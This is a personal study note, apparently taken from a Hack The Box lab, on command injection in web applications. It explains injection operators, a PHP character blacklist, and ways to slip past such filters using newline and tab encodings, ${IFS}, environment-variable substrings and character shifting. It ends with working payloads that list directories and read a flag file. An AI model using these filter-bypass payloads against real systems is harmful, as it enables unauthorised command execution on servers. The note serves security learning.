---
id: Injections
created_date: 28/10/2022
updated_date: 28/10/2022
type: note
---

#  Injections
- **🏷️Tags** :  #10-2022 #SQL #XSS #injection 

| Injection                                       | La description                                                                                                                |
| ----------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------- |
| Injection de commande du système d'exploitation | Se produit lorsque l'entrée de l'utilisateur est directement utilisée dans le cadre d'une commande du système d'exploitation. |
| Injection de code                               | Se produit lorsque l'entrée de l'utilisateur se trouve directement dans une fonction qui évalue le code.                      |
| Injections SQL                                  | Se produit lorsque l'entrée utilisateur est directement utilisée dans le cadre d'une requête SQL.                             |
| Script intersite/injection HTML                 | Se produit lorsque l'entrée exacte de l'utilisateur est affichée sur une page Web.                                            |


## Command Injection Methods

To inject an additional command to the intended one, we may use any of the following operators:

![[Pasted image 20221028235521.png]]

## Blacklisted Characters

A web application may have a list of blacklisted characters, and if the command contains them, it would deny the request. The `PHP` code may look something like the following:

Code: php

```php
$blacklist = ['&', '|', ';', ...SNIP...];
foreach ($blacklist as $character) {
    if (strpos($_POST['ip'], $character) !== false) {
        echo "Invalid input";
    }
}
```

If any character in the string we sent matches a character in the blacklist, our request is denied. Before we start our attempts at bypassing the filter, we should try to identify which character caused the denied request.

we can use `%0a` who mines new line and can be used most of the time

Now that we have a working injection operator, let us modify our original payload and send it again as (`127.0.0.1%0a whoami`)

this not gonna work the **space** is blacklisted, the alternative is to use the code the tabulation, who is `127.0.0.1%0a%09` and this is gonna work.

#### Using $IFS

Using the ($ IFS) Linux Environment Variable may also work since its default value is a space and a tab, which would work between command arguments. So, if we use `${IFS}` where the spaces should be, the variable should be automatically replaced with a space, and our command should work.

Let us use `${IFS}` and see if it works (`127.0.0.1%0a${IFS}`): ![Filter Space](https://academy.hackthebox.com/storage/modules/109/cmdinj_filters_spaces_4.jpg)
# Bypassing Other Blacklisted Characters

---

Besides injection operators and space characters, a very commonly blacklisted character is the slash (`/`) or backslash (`\`) character, as it is necessary to specify directories in Linux or Windows. We can utilize several techniques to produce any character we want while avoiding the use of blacklisted characters.

There are many techniques we can utilize to have slashes in our payload. One such technique we can use for replacing slashes (`or any other character`) is through `Linux Environment Variables` like we did with `${IFS}`. While `${IFS}` is directly replaced with a space, there's no such environment variable for slashes or semi-colons. However, these characters may be used in an environment variable, and we can specify `start` and `length` of our string to exactly match this character.

For example, if we look at the `$PATH` environment variable in Linux, it may look something like the following:

```shell-session
GabrielQK@htb[/htb]$ echo ${PATH}

/usr/local/bin:/usr/bin:/bin:/usr/games
```

So, if we start at the `0` character, and only take a string of length `1`, we will end up with only the `/` character, which we can use in our payload:

```shell-session
GabrielQK@htb[/htb]$ echo ${PATH:0:1}

/
```

We can do the same with the `$HOME` or `$PWD` environment variables as well. We can also use the same concept to get a semi-colon character, to be used as an injection operator. For example, the following command gives us a semi-colon:

```shell-session
GabrielQK@htb[/htb]$ echo ${LS_COLORS:10:1}

;
```

## Character Shifting

There are other techniques to produce the required characters without using them, like `shifting characters`. For example, the following Linux command shifts the character we pass by `1`. So, all we have to do is find the character in the ASCII table that is just before our needed character (we can get it with `man ascii`), then add it instead of `[` in the below example. This way, the last printed character would be the one we need:

```shell-session
GabrielQK@htb[/htb]$ man ascii     # \ is on 92, before it is [ on 91
GabrielQK@htb[/htb]$ echo $(tr '!-}' '"-~'<<<[)

\
```

#### ByPassing Other Blacklisted Char solution
```bash
ip=127.0.0.1%0als${IFS}${PATH:0:1}home
```

#### Bypassing Blacklisted Commands
```bash
ip=127.0.0.0%0ac'a't${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt
```
## Questions/Thoughts


## 🔗 Links
- 